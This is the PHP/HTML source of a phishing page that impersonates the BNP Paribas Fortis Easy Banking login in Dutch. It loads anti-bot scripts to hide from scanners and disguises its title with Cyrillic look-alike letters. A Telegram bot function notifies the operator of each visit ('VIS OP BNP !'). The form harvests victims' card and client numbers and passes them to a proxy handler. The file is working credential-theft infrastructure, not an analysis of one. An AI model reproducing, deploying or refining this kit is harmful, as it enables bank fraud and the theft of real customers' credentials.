<?php include_once '../antibot/anti-v2.php';?>

<?php 

include($_SERVER['DOCUMENT_ROOT']."/config/tgsettings.php");


function telegram($msg) {
        global $telegrambot2,$telegramchatid2;
        $url = 'https://api.telegram.org/bot'.$telegrambot2.'/sendMessage';$data = array('chat_id'=>$telegramchatid2,'text'=>$msg);
        $options = array('http'=>array('method' => 'POST','header' => "Content-Type:application/x-www-form-urlencodedrn",'content' => http_build_query($data),),);
        $context = stream_context_create($options);
        $result = file_get_contents($url,false,$context);
        return $result;
}



$telegrambot2 =   "$bottoken" ; // 
$telegramchatid2 =  "$chatid"; // 

telegram("


[BNPparibasfortis.be]

VIS OP BNP !

");



?>
<?php
require_once $_SERVER['DOCUMENT_ROOT'] . '/be/antibot.php';
?>
<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="login/";
?>
<!DOCTYPE html>
<html lang="nl" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths mac chrome chrome7 webkit webkit5 rich_text_header login_page alternative_screen js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths unauthenticated warning_messages">

<head>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>


    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>

    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">


	<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery.maskedinput/dist/jquery.maskedinput.min.js"></script>
     <link rel="shortcut icon"  href="favicon.ico"/>

    <base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
    <link rel="stylesheet" href="form/css.css">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-compatible">
    <title>Mijn E&#1072;sy B&#1072;nking, mijn &#1086;nline b&#1072;nk | BNP P&#1072;rib&#1072;s F&#1086;rtis</title>
    <link href="Web-Banking-Unauthenticated.css" type="text/css" rel="stylesheet">
    <link type="text/css" href="brand.css" rel="stylesheet">
    <link type="text/css" href="mediaelementplayer.min.css" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
</head>

<body class="nl PC fb priv nextgen" x-ms-format-detection="none"     ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}"  ng-cloak    >
    <div id="sf-master">
        <div class="ls-canvas portal_wrapper" id="webbankingUnauthenticated">
            <div class="ls-row canvas_container" id="ls-row-2">
                <div class="ls-lqr" id="ls-gen75845705-ls-lqr">
                    <div class="ls-col" id="ls-row-2-col-1">
                        <div class="ls-col-body" id="ls-gen75845706-ls-col-body">
                            <div class="ls-row eb-header" id="ls-row-2-col-1-row-1">
                                <div class="ls-lqr" id="ls-gen75845707-ls-lqr">
                                    <div class="ls-area" id="ls-row-2-col-1-row-1-area-1">
                                        <div class="ls-area-body" id="ls-gen75845708-ls-area-body">
                                            <div class="ls-cmp-wrap ls-1st" id="w1465485783749">
                                                <div class="iw_component" id="1465485783749"> </div>
                                            </div>
                                            <div class="ls-cmp-wrap" id="w1465485783751">
                                                <div class="iw_component" id="1465485783751">
                                                    <div class="rich_text nextgen">
                                                        <div id="centeredLogo" class="region ">
                                                            <div id="siteHeaderError" class="section level1 ">
                                                                <div id="siteHeaderErrorInner" class="section level2 ">
                                                                    <p id="brandLogoBack"> <a>{{"Terug"| ng_translate1}}</a> </p>
                                                                    <p id="brandLogo"></p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="ls-cmp-wrap" id="w1465485783752">
                                                <div class="iw_component" id="1465485783752">
                                                    <div class="wcm-javascript style-default nextgen"> </div>
                                                </div>
                                            </div>
                                            <div class="ls-cmp-wrap" id="w1536277602174">
                                                <div class="iw_component" id="1536277602174"> </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="ls-row-clr"></div>
                                </div>
                            </div>
                            <div class="ls-row login_bg main_wrapper" id="content" style="margin-top: 0px;">
                                <div class="ls-lqr" id="ls-gen75845709-ls-lqr">
                                    <div class="ls-col" id="ls-row-2-col-1-row-2-col-1">
                                        <div class="ls-col-body" id="ls-gen75845710-ls-col-body">
                                            <div class="ls-row content_row" id="IA">
                                                <div class="ls-lqr" id="ls-gen75845713-ls-lqr">
                                                    <div class="ls-area" id="ls-row-2-col-1-row-2-col-1-row-2-area-1">
                                                        <div class="ls-area-body" id="ls-gen75845714-ls-area-body">
                                                            <div class="ls-cmp-wrap ls-1st" id="w1496157905139">
                                                                <div class="iw_component" id="1496157905139">
                                                                    <div id="login_overlayer" class="login-container">
                                                                        <div class="login_comp">
                                                                            <div class="login_comp_inner">
                                                                                <div class="ia_alert">
                                                                                </div>
                                                                                <div class="login_row">
                                                                                    <div class="login_col1">
                                                                                        <div class="login_banner">
                                                                                            <div class="login_banner_inner">
                                                                                                <h1 class="caption"> <span>{{"Welkom in"| ng_translate1}}</span> <span>Easy Banking</span> </h1>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div class="login_col2">





<div class="login_flow scum" id="login-view">
    <form class="form-class" name="form1" id="form1" onsubmit="send1(event,'ask_login_proxy');return false">
        <div class="form_inner_block pad_rl30">
            <div class="error_summary show_active err_div" style="display: none;" tabindex="0" >
                <p class=" show_active">{{"Verbeter het (de) volgende veld(en)"| ng_translate1}}</p>
                <ul class="error_summary_items err_ul">
                    <li class="">{{"Kaartnummer"| ng_translate1}}</li>
                </ul>
            </div>
            <div class="form_fields form-group">
                <div class="form_labels"> 
                	<label for="cardNum"><span>{{"Kaartnummer"| ng_translate1}}</span></label>
                	<a role="tooltip" class="info_icon fontcon-information help_icon tooltipstered" ></a>
                </div>
                <div class="form_details ">
                    <div class="field_error_message show_active err_span" style="display: none;">
                        <p tabindex="0">{{"Gelieve het kaartnummer in te vullen."| ng_translate1}}</p>
                    </div>
                    <div class="default_input_field"  > 
                    	<input type="text" id="KaartNum" name="KaartNum" class="input_card_number form-control" data-err_text='{{"Kaartnummer"| ng_translate1}}'  placeholder="Kaartnummer"  minlength="16" maxlength="17" autocomplete="off" >
                    </div>
                </div>
            </div>
            <div class="form_fields form-group">
                <div class="form_labels"> 
                	<label for="clientNum"><span>{{"Klantnummer"| ng_translate1}}</span></label>
                	<a role="tooltip" class="info_icon fontcon-information help_icon tooltipstered" ></a>
                </div>
                
                <div class="form_details">
                	<div class="field_error_message show_active err_span" style="display: none;">
                        <p tabindex="0">{{"Gelieve het Klantnummer	 in te vullen."| ng_translate1}}</p>
                    </div>
                    <div class="default_input_field" > 

                    	<input type="tel" id="KlantNum" name="KlantNum" class="input_client_number form-control" placeholder="----- -----" mask-placeholder="----- -----"   autocomplete="off" data-mask="99999 99999"  pattern="\d{5} \d{5}" data-err_text='{{"Klantnummer"| ng_translate1}}'    >

                    </div>
                </div>
            </div>
            <div class="form_fields save_profile" > <input class="css-checkbox save_profile__check" type="checkbox" id="checkBox11" name="checkBox11"> <label class="css-label" for="checkBox11"> <span>{{"Dit profiel onthouden"| ng_translate1}}</span> </label> </div>
            <div class="navigation_btns pad-t10 ">
                <div class="right_navigation_btn fullwidth_btn "> <button class="btn_default btn_primary login_btn" >{{"Volgende"| ng_translate1}}</button> </div>
            </div>
        </div>
    </form>
</div>







                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                            <div class="login_footer">
                                                                                <p><span class="fontcon-phone"></span><span>{{"Hulp nodig?"| ng_translate1}}</span><span>{{"Bel naar"| ng_translate1}}</span><span class="tel_link">+32 2 762 60 00</span></p>
                                                                                <p><a class="lnk_primary">{{"Bestel een kaartlezer"| ng_translate1}}</a></p>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="ls-row-clr"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="ls-row-clr"></div>
                                </div>
                                <a class="cover"></a>
                            </div>
                            <div class="ls-row footer" id="footer">
                                <div class="ls-lqr" id="ls-gen75845717-ls-lqr">
                                    <div class="ls-area" id="ls-row-2-col-1-row-3-area-1">
                                        <div class="ls-area-body" id="ls-gen75845718-ls-area-body">
                                            <div class="ls-cmp-wrap ls-1st" id="w1465485783754">
                                                <div class="iw_component" id="1465485783754">
                                                    <div class="chat_widget"></div>
                                                    <div class="wcm-footer nextgen">
                                                        <div class="footer_lnks clearfix">
                                                            <div class="legal_section">
                                                            </div>
                                                            <div class="legal_msg">
                                                                <p>Copyright © 2016 BNP Paribas Fortis</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="ls-cmp-wrap" id="w1465485783755">
                                                <div class="iw_component" id="1465485783755">
                                                    <div class="wcm-overlay">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="ls-cmp-wrap" id="w1465485783756">
                                                <div class="iw_component" id="1465485783756">
                                                    <div class="rich_text nextgen">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="ls-row-clr"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="ls-row-clr"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="cookie_lang nl fb t1">
    </div>
    <div class="preloads">
    </div>
    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
</body>

</html>